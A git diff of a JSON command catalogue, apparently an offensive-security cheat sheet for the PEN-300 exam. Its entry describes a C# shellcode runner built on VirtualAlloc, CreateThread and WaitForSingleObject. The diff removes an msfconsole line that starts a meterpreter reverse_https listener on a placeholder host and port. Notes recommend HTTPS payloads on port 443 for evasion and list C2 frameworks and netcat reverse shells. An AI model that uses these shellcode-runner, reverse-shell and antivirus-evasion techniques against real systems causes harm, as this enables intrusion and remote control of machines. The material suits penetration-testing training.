@@ -5,7 +5,7 @@
     {
       "id": "csharp-shellcode-runner-basic",
       "name": "C# Shellcode Runner (Basic)",
-      "description": "Basic C# template for executing raw shellcode via VirtualAlloc → CreateThread → WaitForSingleObject pattern. Foundation for all custom runners.",
+      "description": "Basic C# template for executing raw shellcode via VirtualAlloc \u2192 CreateThread \u2192 WaitForSingleObject pattern. Foundation for all custom runners.",
       "category": "shellcode-runners",
       "tags": [
         "anti-virus",
@@ -208,9 +208,7 @@
           "required": true
         }
       ],
-      "prerequisites": [
-        "# Start listener\nmsfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST <LHOST>; set LPORT <LPORT>; run'"
-      ],
+      "prerequisites": [],
       "notes": "Syntax: Run on Kali, copy output to C# runner Always use HTTPS payloads (not HTTP) for better evasion. Port 443 blends with legitimate traffic. Generate before exam, don't waste time during. Time estimate: 30 seconds References: docs/av-evasion/shellcode-runners.md#msfvenom-generation, PEN-300 Chapter 6.4 Manual alternative: Use custom reverse shell (bash, python, netcat) or C2 frameworks (Cobalt Strike, Sliver, Havoc)",
       "success_indicators": [
         "Shellcode byte array in C# format:\nbyte[] buf = new byte[xxx] { 0xfc,0x48,0x83,... };"
